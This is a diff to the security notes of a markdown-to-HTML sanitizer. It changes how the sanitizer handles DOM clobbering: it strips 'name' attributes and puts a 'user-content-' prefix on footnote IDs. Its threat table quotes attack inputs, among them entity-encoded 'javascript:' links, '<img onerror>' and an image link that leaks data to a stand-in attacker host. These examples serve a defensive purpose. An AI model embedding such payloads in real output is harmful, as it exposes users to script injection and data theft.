@@ -38,7 +38,7 @@ the same per-element gate**, so the security posture is backend-independent.
 | `<script>`, event handlers (`onclick`, …), arbitrary/unknown tags | Not on the sink allowlist — stripped or unwrapped. The allowlist mirrors exactly what the renderer is meant to emit (prose + GFM tables + code + math/mermaid scaffolding). |
 | `javascript:` / `data:` / `vbscript:` in a markdown link or image | Scheme allowlist (`safeLinkHref`), applied **after** decoding HTML entities and backslash escapes, so `&#x6a;avascript:` and friends are caught before the check. Default schemes: `http(s)`, `mailto`, `tel`, `sms`, `ftp(s)`. |
 | Raw HTML in the input (`<div>`, `<img onerror>`, …) | Passthrough by default — the renderer emits well-formed tags and the sink is the sole arbiter (allowlisted → element, else stripped/unwrapped). `htmlPolicy: 'escape'` literalizes it instead. The allowlist is **not** widened by passthrough. |
-| DOM clobbering via attacker `id` (shadowing `document.forms`, etc.) | The per-element gate strips every `id` outside the renderer-emitted footnote shape (`fn-…` / `fnref-…`). No attacker-chosen id survives. |
+| DOM clobbering via attacker `id` / `name` | The shared element gate strips `name` (including host extensions), drops IDs outside the footnote shape, and prefixes accepted IDs with `user-content-`. Matching fragment links and ARIA references are rewritten together. Hosts must reserve that namespace for untrusted content. See the namespace policy below. |
 | Focus stops / landmark roles via raw `role` / `tabindex` | Neither is on the allowlist. With the opt-in `tableWrapper`, the sink admits both names only so the renderer's table wrapper survives, and a per-element gate keeps them only on that exact shape (a `<div>` with the configured class whose sole element child is a `<table>`, forced to `role="region"` / `tabindex="0"`), stripping them everywhere else. Raw HTML copying that shape gets the same table scroll region, nothing more. |
 | Interactive/form injection via `<input>` | The gate keeps only the fixed read-only GFM task-list checkbox (`type=checkbox disabled`); any other `<input>` is dropped. |
 | Exfiltration via image/link destination (a prompt-injection classic: `![](https://attacker/?leak=…)`) | Opt-in **link/image origin policy** (`linkImagePolicy`) restricts which origins links/images may resolve to, compared after WHATWG canonicalization (credential-stripping, punycode, `\`→`/`, scheme-relative) so the usual allowlist bypasses fail. `data:` images can be blocked too. |
@@ -90,6 +90,43 @@ can hold different policies without bleed (see [#137 / ADR 0003](decisions/0003-
   trusted (post-sink). Pin and review those dependencies.
 
 ## Known considerations
+
+- **DOM clobbering namespace policy.** Both bundled sanitizers apply the same
+  core element gate to their string and node paths. Every accepted footnote ID
+  receives a fixed `user-content-` prefix, including IDs supplied by raw HTML.
+  For example, `fn-note` becomes `user-content-fn-note` and `footnote-label`
+  becomes `user-content-footnote-label`. Matching `href` fragments (including
+  percent-encoded fragments), `aria-describedby`, and `aria-labelledby` tokens
+  receive the same prefix, preserving footnote navigation and accessibility.
+  Already-prefixed IDs and references stay unchanged on repeated sanitization.
+  Other IDs are stripped. `name` is stripped even when a host extension admits
+  it, including on disabled checkboxes and attributes added by host element
+  hooks. Use `data-*` for host metadata instead.
+
+  This is namespace isolation, not removal of every browser named property:
+  `window['user-content-fn-note']` can still resolve to content. Hosts must
+  reserve `user-content-` for untrusted DOM and keep trusted configuration in
+  module/local bindings rather than reading it through `window` or `document`.
+  A fixed prefix does not authenticate an element's origin: raw HTML can still
+  duplicate an ID **inside** the reserved namespace and interfere with footnote
+  navigation there. Use `htmlPolicy: 'escape-all'` to prevent raw-element
+  forgery and a distinct `footnoteIdPrefix` per message to avoid accidental
+  cross-message collisions. Neither sanitizer output nor a DOM lookup inside
+  it should be treated as trusted application configuration.
+
+  This changes sanitized footnote IDs and fragment URLs; `renderMarkdownUnsafe`
+  retains its raw IDs. With `footnoteIdPrefix: 'message-7-'`, sanitized IDs are
+  `user-content-fn-message-7-note`, `user-content-fnref-message-7-note`, and
+  `user-content-message-7-footnote-label`. Hosts using custom CSS selectors or
+  DOM lookups for footnotes should account for this prefix.
+
+  [Browser regression tests](../tests/dom-clobbering.e2e.test.ts) cover both
+  sanitizers, both sinks, streaming prefixes, repeated references, custom
+  message prefixes, ARIA links, repeated sanitization, and host extensions.
+  Diagram/math hydration and custom sanitizer backends remain separate trust
+  boundaries as described above. This policy follows the namespace-isolation
+  approach described in the
+  [OWASP DOM Clobbering Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html).
 
 - **Angle autolinks (`<scheme:…>`) use a deny-list**, not the markdown-link
   allowlist: they reject `javascript:`/`data:`/`vbscript:` but permit other
